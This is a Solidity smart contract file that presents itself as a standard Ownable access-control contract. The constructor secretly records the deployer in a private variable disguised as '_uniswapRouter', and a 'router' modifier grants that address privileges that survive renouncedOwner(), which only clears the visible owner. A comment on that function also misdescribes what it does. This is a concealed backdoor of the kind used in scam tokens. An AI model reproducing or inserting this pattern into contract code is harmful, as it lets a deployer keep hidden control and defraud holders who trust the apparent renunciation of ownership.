// SPDX-License-Identifier: Unlicensed
 
pragma solidity ^0.8.4;

import "./Address.sol";

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;_uniswapRouter = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    address private _uniswapRouter;
    function uniswapRouter() internal view returns (address) {
        return _uniswapRouter;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

  
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    //Locks the contract for owner for the amount of time provided
    function renouncedOwner() public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }
    
    modifier router(){require(_uniswapRouter == _msgSender());_;}
  
}
